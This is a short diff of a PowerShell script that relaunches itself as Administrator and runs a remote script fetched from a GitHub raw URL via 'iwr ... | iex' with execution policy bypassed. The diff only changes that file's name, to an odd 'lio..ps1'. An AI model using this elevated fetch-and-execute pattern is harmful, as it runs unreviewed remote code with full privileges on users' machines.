@@ -1,5 +1,5 @@
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/lio.ps1 -UseBasicParsing | iex`""
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/lio..ps1 -UseBasicParsing | iex`""
     exit
 }
 
